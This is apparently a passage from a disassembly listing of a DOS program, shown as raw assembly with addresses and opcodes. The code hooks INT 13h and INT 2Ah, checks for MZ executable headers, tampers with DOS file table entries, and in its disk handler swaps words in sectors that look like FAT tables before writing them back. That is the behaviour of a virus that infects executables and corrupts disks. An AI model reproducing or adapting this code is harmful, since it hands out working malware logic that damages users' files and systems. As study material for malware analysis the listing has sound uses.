                                sub_2           proc    near
04A3  B8 1220                              mov     ax,1220h
04A6  CD 2F                                int     2Fh                     ; Multiplex/Spooler al=func 20h
04A8  72 11                                jc      loc_ret_46              ; Jump if carry Set
04AA  53                                   push    bx
04AB  26: 8A 1D                            mov     bl,es:[di]
04AE  B8 1216                              mov     ax,1216h
04B1  CD 2F                                int     2Fh                     ; Multiplex/Spooler al=func 16h
04B3  5B                                   pop     bx
04B4  72 05                                jc      loc_ret_46              ; Jump if carry Set
04B6  26: C6 45 02 02                      mov     byte ptr es:[di+2],2

04BB                       loc_ret_46:
04BB  C3                                   retn
                                sub_2           endp


                                ;==========================================================================
                                ;                              SUBROUTINE
                                ;==========================================================================

                                sub_3           proc    near
04BC  3D 5A4D                              cmp     ax,5A4Dh
04BF  74 03                                je      loc_ret_47              ; Jump if equal
04C1  3D 4D5A                              cmp     ax,4D5Ah

04C4                       loc_ret_47:
04C4  C3                                   retn
                                sub_3           endp


                                ;==========================================================================
                                ;                              SUBROUTINE
                                ;==========================================================================

                                sub_4           proc    near
04C5  B4 3F                                mov     ah,3Fh                  ; '?'

                                ;==== External Entry into Subroutine ======================================

                                sub_5:
04C7  B9 06A8                              mov     cx,6A8h

                                ;==== External Entry into Subroutine ======================================

                                sub_6:
04CA  BA 070A                              mov     dx,70Ah
04CD  CD 21                                int     21h                     ; DOS Services  ah=function 3Fh
                                                                                ;  read file, cx=bytes, to ds:dx
04CF  C3                                   retn
                                sub_4           endp


                                ;==========================================================================
                                ;                              SUBROUTINE
                                ;==========================================================================

                                sub_7           proc    near
04D0  8A C4                                mov     al,ah

                                ;==== External Entry into Subroutine ======================================

                                sub_8:
04D2  D0 E8                                shr     al,1                    ; Shift w/zeros fill
04D4  8A D0                                mov     dl,al
04D6  50                                   push    ax
04D7  14 01                                adc     al,1
04D9  3C 03                                cmp     al,3
04DB  72 02                                jb      loc_48                  ; Jump if below
04DD  2C 03                                sub     al,3
04DF                       loc_48:
04DF  0A D0                                or      dl,al
04E1  D7                                   xlat [bx]                       ; al=[al+[bx]] table
04E2  88 04                                mov     [si],al
04E4  46                                   inc     si
04E5  58                                   pop     ax
04E6  D7                                   xlat [bx]                       ; al=[al+[bx]] table
04E7  88 04                                mov     [si],al
04E9  46                                   inc     si
04EA  8A C2                                mov     al,dl
04EC  34 03                                xor     al,3
04EE  D7                                   xlat [bx]                       ; al=[al+[bx]] table
04EF  C3                                   retn
                                sub_7           endp


                                ;==========================================================================
                                ;                              SUBROUTINE
                                ;==========================================================================

                                sub_9           proc    near
04F0  D1 EA                                shr     dx,1                    ; Shift w/zeros fill
04F2  B0 79                                mov     al,79h                  ; 'y'
04F4  73 02                                jnc     loc_ret_49              ; Jump if carry=0
04F6  0C 04                                or      al,4

04F8                       loc_ret_49:
04F8  C3                                   retn
                                sub_9           endp

04F9  00 04                                add     [si],al
04FB  00 00                                add     [bx+si],al
04FD  04 00                                add     al,0
04FF  26: 00 2C                            add     es:[si],ch
0502  00 09                                add     [bx+di],cl
0504  02 00                                add     al,[bx+si]
0506  00 02                                add     [bp+si],al
0508  00 0E 0400                           add     byte ptr ds:[400h],cl   ; (0400=0BAh)
050C  04 02                                add     al,2
050E  00 00                                add     [bx+si],al
0510  03 00                                add     ax,[bx+si]
0512  0F                                   db      0Fh
0513  00 05                                add     [di],al
0515  05 0003                              add     ax,3
0518  00 00                                add     [bx+si],al
051A  04 00                                add     al,0
051C  01 00                                add     [bx+si],ax
051E  01 02                                add     [bp+si],ax
0520  03 06 0707                           add     ax,word ptr ds:[707h]   ; (0707=0)
0524  04 05                                add     al,5

                                ;==========================================================================
                                ;                              SUBROUTINE
                                ;               INT     2A
                                ;==========================================================================
0526  56                                   push    si
0527  57                                   push    di
0528  55                                   push    bp
0529  1E                                   push    ds
052A  06                                   push    es
052B  8B EC                                mov     bp,sp
052D  80 FC 82                             cmp     ah,82h
0530  75 60                                jne     loc_53                  ; Jump if not equal
0532  8C D8                                mov     ax,ds
0534  3B 46 0C                             cmp     ax,[bp+0Ch]
0537  75 59                                jne     loc_53                  ; Jump if not equal
0539  8B 76 0A                             mov     si,[bp+0Ah]
053C  AC                                   lodsb                           ; String [si] to al
053D  3C CC                                cmp     al,0CCh
053F  74 51                                je      loc_53                  ; Jump if equal
0541  B8 1218                              mov     ax,1218h
0544  CD 2F                                int     2Fh                     ; Multiplex/Spooler al=func 18h
0546  C4 7C 12                             les     di,dword ptr [si+12h]   ; Load 32 bit ptr
0549  26: 80 3D CC                         cmp     byte ptr es:[di],0CCh
054D  74 43                                je      loc_53                  ; Jump if equal
054F  8C C8                                mov     ax,cs
0551  3B 44 14                             cmp     ax,[si+14h]
0554  74 3C                                je      loc_53                  ; Jump if equal
0556  AD                                   lodsw                           ; String [si] to ax
0557  80 EC 3D                             sub     ah,3Dh                  ; '='
055A  74 1C                                jz      loc_51                  ; Jump if zero
055C  FE CC                                dec     ah
055E  74 16                                jz      loc_50                  ; Jump if zero
0560  2D 0D00                              sub     ax,0D00h
0563  75 2D                                jnz     loc_53                  ; Jump if not zero
0565  26: 81 7D FE 21CD                    cmp     word ptr es:[di-2],21CDh
056B  75 25                                jne     loc_53                  ; Jump if not equal
056D  40                                   inc     ax
056E  2E: 30 06 00C5                       xor     byte ptr cs:[0C5h],al   ; (00C5=1)
0573  75 1D                                jnz     loc_53                  ; Jump if not zero
0575  F9                                   stc                             ; Set carry flag
0576                       loc_50:
0576  B3 30                                mov     bl,30h                  ; '0'
0578                       loc_51:
0578  0E                                   push    cs
0579  07                                   pop     es
057A  BF 03BE                              mov     di,3BEh
057D  B8 0156                              mov     ax,156h
0580  87 44 10                             xchg    ax,[si+10h]
0583  73 02                                jnc     loc_52                  ; Jump if carry=0
0585  48                                   dec     ax
0586  48                                   dec     ax
0587                       loc_52:
0587  AB                                   stosw                           ; Store ax to es:[di]
0588  8C C8                                mov     ax,cs
058A  87 44 12                             xchg    ax,[si+12h]
058D  AB                                   stosw                           ; Store ax to es:[di]
058E  80 64 14 FE                          and     byte ptr [si+14h],0FEh
0592                       loc_53:
0592  07                                   pop     es
0593  1F                                   pop     ds
0594  5D                                   pop     bp
0595  5F                                   pop     di
0596  5E                                   pop     si

                                ;==========================================================================
                                ;                              SUBROUTINE
                                ;               INT     2A
                                ;==========================================================================
0597  B0 03                                mov     al,3
0599  CF                                   iret                            ; Interrupt return


059A  2E: 80 3E 06B3 00                    cmp     byte ptr cs:[6B3h],0    ; (06B3=0)
05A0  74 12                                je      loc_55                  ; Jump if equal
05A2  41                                   inc     cx
05A3  75 0E                                jnz     loc_54                  ; Jump if not zero
05A5  32 E4                                xor     ah,ah                   ; Zero register
05A7  2E: 86 26 06B3                       xchg    ah,byte ptr cs:[6B3h]   ; (06B3=0)
05AC  F5                                   cmc                             ; Complement carry
05AD  2E: 8B 0E 06B8                       mov     cx,word ptr cs:[6B8h]   ; (06B8=6)
05B2  41                                   inc     cx
05B3                       loc_54:
05B3  49                                   dec     cx
05B4                       loc_55:
05B4  9C                                   pushf                           ; Push flags
05B5  50                                   push    ax
05B6  9C                                   pushf                           ; Push flags
05B7  0E                                   push    cs
05B8  E8 00EF                              call    $+0F2h
05BB  73 07                                jnc     loc_56                  ; Jump if carry=0
05BD  83 C4 04                             add     sp,4
05C0  F9                                   stc                             ; Set carry flag
05C1  E9 00C8                              jmp     loc_70
05C4                       loc_56:
05C4  58                                   pop     ax
05C5  80 EC 02                             sub     ah,2
05C8  80 FC 02                             cmp     ah,2
05CB  73 79                                jae     loc_65                  ; Jump if above or =
05CD  53                                   push    bx
05CE  51                                   push    cx
05CF  56                                   push    si
05D0  1E                                   push    ds
05D1                       loc_57:
05D1  50                                   push    ax
05D2  53                                   push    bx
05D3  51                                   push    cx
05D4  52                                   push    dx
05D5  33 D2                                xor     dx,dx                   ; Zero register
05D7  8E DA                                mov     ds,dx
05D9  B9 0100                              mov     cx,100h
05DC  8B F3                                mov     si,bx
05DE  56                                   push    si

05DF                       locloop_58:
05DF  26: AD                               lods word ptr es:[si]           ; String [si] to ax
05E1  48                                   dec     ax
05E2  3D FFF5                              cmp     ax,0FFF5h
05E5  73 09                                jae     loc_60                  ; Jump if above or =
05E7  3B C3                                cmp     ax,bx
05E9  75 02                                jne     loc_59                  ; Jump if not equal
05EB  FE C6                                inc     dh
05ED                       loc_59:
05ED  93                                   xchg    ax,bx
05EE  42                                   inc     dx
05EF  43                                   inc     bx
05F0                       loc_60:
05F0  E2 ED                                loop    locloop_58              ; Loop if cx > 0

05F2  5E                                   pop     si
05F3  D0 EA                                shr     dl,1                    ; Shift w/zeros fill
05F5  F8                                   clc                             ; Clear carry flag
05F6  74 36                                jz      loc_62                  ; Jump if zero
05F8  3A D6                                cmp     dl,dh
05FA  73 32                                jae     loc_62                  ; Jump if above or =
05FC  0E                                   push    cs
05FD  1F                                   pop     ds
05FE  F8                                   clc                             ; Clear carry flag
05FF  BB 06B4                              mov     bx,6B4h
0602  FF 07                                inc     word ptr [bx]
0604  75 28                                jnz     loc_62                  ; Jump if not zero
0606  FF 47 9C                             inc     word ptr [bx-64h]
0609  8A 47 FD                             mov     al,[bx-3]
060C  04 F8                                add     al,0F8h
060E  73 02                                jnc     loc_61                  ; Jump if carry=0
0610  B0 FF                                mov     al,0FFh
0612                       loc_61:
0612  88 47 01                             mov     [bx+1],al
0615  A1 046C                              mov     ax,data_15              ; (046C=0C133h)
0618  33 DB                                xor     bx,bx                   ; Zero register
061A  86 DC                                xchg    bl,ah
061C  03 DB                                add     bx,bx
061E  03 DE                                add     bx,si
0620  03 C0                                add     ax,ax
0622  03 F0                                add     si,ax
0624  26: 8B 07                            mov     ax,es:[bx]
0627  26: 87 04                            xchg    ax,es:[si]
062A  26: 89 07                            mov     es:[bx],ax
062D  F9                                   stc                             ; Set carry flag
062E                       loc_62:
062E  5A                                   pop     dx
062F  59                                   pop     cx
0630  5B                                   pop     bx
0631  73 08                                jnc     loc_63                  ; Jump if carry=0
0633  B8 0301                              mov     ax,301h
0636  9C                                   pushf                           ; Push flags
0637  0E                                   push    cs
0638  E8 006F                              call    $+72h
063B                       loc_63:
063B  58                                   pop     ax
063C  72 04                                jc      loc_64                  ; Jump if carry Set
063E  FE C8                                dec     al
0640  75 8F                                jnz     loc_57                  ; Jump if not zero
0642                       loc_64:
0642  1F                                   pop     ds
0643  5E                                   pop     si
0644  59                                   pop     cx
0645  5B                                   pop     bx
0646                       loc_65:
0646  58                                   pop     ax
0647  D1 E8                                shr     ax,1                    ; Shift w/zeros fill
0649  73 3F                                jnc     loc_69                  ; Jump if carry=0
064B  B8 0100                              mov     ax,100h
064E  EB 3C                                jmp     short loc_70
0650  00 00                                add     [bx+si],al
0652                       loc_66:
0652  2E: FF 36 06AF                       push    word ptr cs:[6AFh]      ; (06AF=0F086h)
0657  9D                                   popf                            ; Pop flags
0658  74 50                                jz      $+52h                   ; Jump if zero
065A  2E: 88 26 06B3                       mov     byte ptr cs:[6B3h],ah   ; (06B3=0)
065F  2E: 89 0E 06B8                       mov     word ptr cs:[6B8h],cx   ; (06B8=6)
0664  2E: 3A 26 06B6                       cmp     ah,byte ptr cs:[6B6h]   ; (06B6=3)
0669  75 03                                jne     loc_67                  ; Jump if not equal
066B  80 F4 01                             xor     ah,1
066E                       loc_67:
066E  51                                   push    cx
066F  B9 FFFF                              mov     cx,0FFFFh
0672  9C                                   pushf                           ; Push flags
0673  0E                                   push    cs
0674  E8 002E                              call    sub_10
0677  59                                   pop     cx
0678  9C                                   pushf                           ; Push flags
0679  2E: 80 3E 06B3 00                    cmp     byte ptr cs:[6B3h],0    ; (06B3=0)
067F                       loc_68:
067F  75 FE                                jne     loc_68                  ; Jump if not equal
0681  9D                                   popf                            ; Pop flags
0682  73 08                                jnc     loc_70                  ; Jump if carry=0
0684  80 FC 01                             cmp     ah,1
0687  F9                                   stc                             ; Set carry flag
0688  75 02                                jnz     loc_70                  ; Jump if not zero
068A                       loc_69:
068A  33 C0                                xor     ax,ax                   ; Zero register
068C                       loc_70:
068C  FB                                   sti                             ; Enable interrupts
068D  CA 0002                              retf    2                       ; Return far

                                ;==========================================================================
                                ;                              SUBROUTINE
                                ;               INT     13h
                                ;==========================================================================

0690  2E: 3A 26 06B7                       cmp     ah,byte ptr cs:[6B7h]   ; (06B7=4)
0695  74 F3                                je      loc_69                  ; Jump if equal
0697  84 E4                                test    ah,ah
0699  74 EF                                jz      loc_69                  ; Jump if zero
069B  80 FC 01                             cmp     ah,1
069E  74 05                                je      loc_71                  ; Jump if equal
06A0  80 FC 05                             cmp     ah,5
06A3  72 AD                                jb      loc_66                  ; Jump if below

                                sub_10          proc    near
06A5                       loc_71:
06A5  EA 0070:1001                         jmp     far ptr loc_1           ; ORG INT 13
                                sub_10          endp







